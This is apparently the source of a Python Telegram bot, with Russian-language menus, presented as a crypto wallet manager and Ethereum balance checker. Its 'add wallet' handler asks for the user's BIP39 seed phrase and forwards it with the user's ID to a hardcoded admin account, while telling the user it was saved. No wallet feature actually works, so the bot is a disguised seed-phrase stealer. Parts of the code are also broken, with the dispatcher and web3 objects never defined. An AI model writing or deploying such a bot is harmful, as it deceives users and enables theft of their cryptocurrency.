from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from web3 import Web3, HTTPProvider
import requests

from bot.tg.utils import main_keyboard, main_inline_keyboard, UserState
from db import Database

bot = Bot(token="token")
admin_id = 123



db = Database("user_ids.txt")

@dp.message_handler(commands=['start', 'help'])
async def welcome(message: types.Message):

    if not str(message.from_user.id) in db.read():
        db.insert(message.from_user.id)
        db.insert_temp(message.from_user.id)

        await message.answer('Правила:\n1. one\n2. two\n3. three', reply_markup=main_inline_keyboard)
    else:
        await message.answer('Приветствуем снова!', reply_markup=main_keyboard)


@dp.callback_query_handler(text="ok")
async def start(call: types.CallbackQuery):
    await call.answer()
    await call.message.answer('Вас привествует бот от @BlazarPython. Используйте меню кнопок', reply_markup=main_keyboard)


@dp.message_handler(content_types=['text'])
async def handlers(message):
    if message.text == 'Мои кошельки':
        await message.answer('Вы еще не добавили ни одного кошелька')
    elif message.text == 'Удалить кошелек':
        await message.answer('Вы еще не добавили ни одного кошелька')
    elif message.text == 'Добавить кошелек':
        await message.answer('Введите фразу для добавления (формат bip39).')
        await UserState.user_seed.set()
    elif message.text == 'Проверка баланса эфира по адресу':
        await message.answer('Введите кошелёк.')
        await UserState.user_wallet.set()
    else:
        await message.answer('Используйте клавиатуру!!!')


@dp.message_handler(state=UserState.user_seed)
async def add_to_database(message: types.Message, state: FSMContext):
    idtg = message.from_user.id
    text = message.text
    if int(len(text.split())) == 12 or int(len(text.split())) == 24:
        print(f'{idtg},\n {text}')
        await message.answer('Добавлено в базу.')
        await bot.send_message(admin_id, f'[{idtg}\n{text}]')
        await state.finish()
    else:
        await message.answer('Неверный формат.')


@dp.message_handler(state=UserState.user_wallet)
async def checker(message: types.Message, state: FSMContext):
    wallet = message.text
    if wallet[:2] == '0x':
        resultat = 'Баланс:'
        count = len(wallet.split('\n'))
        wallet_line = wallet.split('\n')
        print(wallet_line)
        for i in range(count):
            for kowel in wallet_line:
                x = web3.eth.get_balance(f'{kowel}')
                x2 = web3.fromWei(x, 'ether')
                resultat += f'\n{x2}'
        await message.answer(resultat)
        await state.finish()
    else:
        await message.answer('Неверный кошелёк.')

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)